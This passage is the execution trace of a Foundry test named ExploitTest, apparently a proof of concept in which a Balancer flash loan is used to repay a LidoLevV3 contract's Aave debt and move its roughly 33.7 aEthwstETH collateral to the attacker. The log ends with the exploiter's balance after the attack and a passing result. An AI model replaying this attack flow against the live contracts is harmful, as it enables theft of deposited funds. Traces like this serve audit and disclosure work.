    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3038] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2486] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1325] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [805] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35002954502486078893 [3.5e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35002954502486078893 [3.5e19]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9487] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19], 1035024658069051456948664591 [1.035e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8926] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19], 1035024658069051456948664591 [1.035e27]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1201] 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 452915389085583398685451 [4.529e23], 33818474013737809897 [3.381e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [675] 0xE7B67F44eA304DD7f6d215b13686637ff64CD2B2::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 452915389085583398685451 [4.529e23], 33818474013737809897 [3.381e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 35002954502486078893 [3.5e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Burn(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: 0x0000000000000000000000000000000000000000, param2: 35002954502486078893 [3.5e19], param3: 0, param4: 1035024658069051456948664591 [1.035e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005fe6c256c9d32c015322
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005fe6c256c9d32c015322
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5160] 0x06B1Ec378618EA736a65395eA5CAB69A2410493B::calculateInterestRates((0, 35002954502486078893 [3.5e19], 0, 0, 468743592768014871366825 [4.687e23], 0, 1500, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8)) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 143328227390135769224983 [1.433e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000cd3e87f7cafba07662bc50000000000000000000000000000000000000000004c212ab69fa50ee80243e600000000000000000000000000000000000000000013b5084a0a0d0de69b2f88
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveDataUpdated(param0: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param1: 15507817994296699304422341 [1.55e25], param2: 92034988307315731011355622 [9.203e25], param3: 23824491815121011707948936 [2.382e25], param4: 1019369531491344843689208548 [1.019e27], param5: 1035024658069051456948664591 [1.035e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3425] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, 35002954502486078893 [3.5e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, value: 35002954502486078893 [3.5e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1136] 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8::handleRepayment(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [578] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::handleRepayment(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Repay(param0: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param1: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param2: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param3: 35002954502486078893 [3.5e19], param4: false)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000001e5c379aa99d7b5ad
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35002954502486078893 [3.5e19]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35002954502486078893 [3.5e19]
    в”‚   в”‚   в”њв”Ђ [3082] aEthwstETH::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2530] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1356] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [804] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 33698806193381635860 [3.369e19]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 33698806193381635860 [3.369e19]
    в”‚   в”‚   в”њв”Ђ [68076] aEthwstETH::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19])
    в”‚   в”‚   в”‚   в”њв”Ђ [67521] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1356] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [804] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1201] 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840277344194556828894021 [8.402e23], 33681044764761642582 [3.368e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [675] 0xE7B67F44eA304DD7f6d215b13686637ff64CD2B2::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840277344194556828894021 [8.402e23], 33681044764761642582 [3.368e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1201] 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb::handleAction(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 840277344194556828894021 [8.402e23], 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [675] 0xE7B67F44eA304DD7f6d215b13686637ff64CD2B2::handleAction(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 840277344194556828894021 [8.402e23], 0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 33698806193381635860 [3.369e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [33031] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::finalizeTransfer(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19], 33698806193381635860 [3.369e19], 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [32455] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::finalizeTransfer(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19], 33698806193381635860 [3.369e19], 0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [402] 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e::getPriceOracle() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x54586bE62E3c3580375aE3723C145253060Ca0C2
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [29145] 0x589F82Ff8162Fa96545b435435713E9D6ca79fBB::8a5dadd1(00000000000000000000000000000000000000000000000000000000000000340000000000000000000000000000000000000000000000000000000000000036000000000000000000000000000000000000000000000000000000000000003700000000000000000000000000000000000000000000000000000000000000350000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000001d3aa35b05f3ef714000000000000000000000000000000000000000000000001d3aa35b05f3ef7140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b00000000000000000000000054586be62e3c3580375ae3723c145253060ca0c20000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveUsedAsCollateralDisabled(param0: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, param1: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveUsedAsCollateralEnabled(param0: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, param1: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit BalanceTransfer(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 33681044764761642582 [3.368e19], param3: 1000527341973624759506438367 [1e27])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [234] ExploitTest::createAaveDebt(35002954502486078893 [3.5e19])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 0)
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 0)
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 55912009748616849239618 [5.591e22]
    в”‚   в”њв”Ђ emit FlashLoan(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param2: 0, param3: 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [3082] aEthwstETH::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [2530] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”њв”Ђ [1356] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [804] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 33698806193381635860 [3.369e19]
    в”‚   в””в”Ђ в†ђ [Return] 33698806193381635860 [3.369e19]
    в”њв”Ђ [874] aEthwstETH::decimals() [staticcall]
    в”‚   в”њв”Ђ [357] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::decimals() [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в””в”Ђ в†ђ [Return] 18
    в”њв”Ђ emit log_named_decimal_uint(key: "Exploiter aEthwstETH balance after attack", val: 33698806193381635860 [3.369e19], decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.79s (10.21s CPU time)

Ran 2 test suites in 11.12s (11.09s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
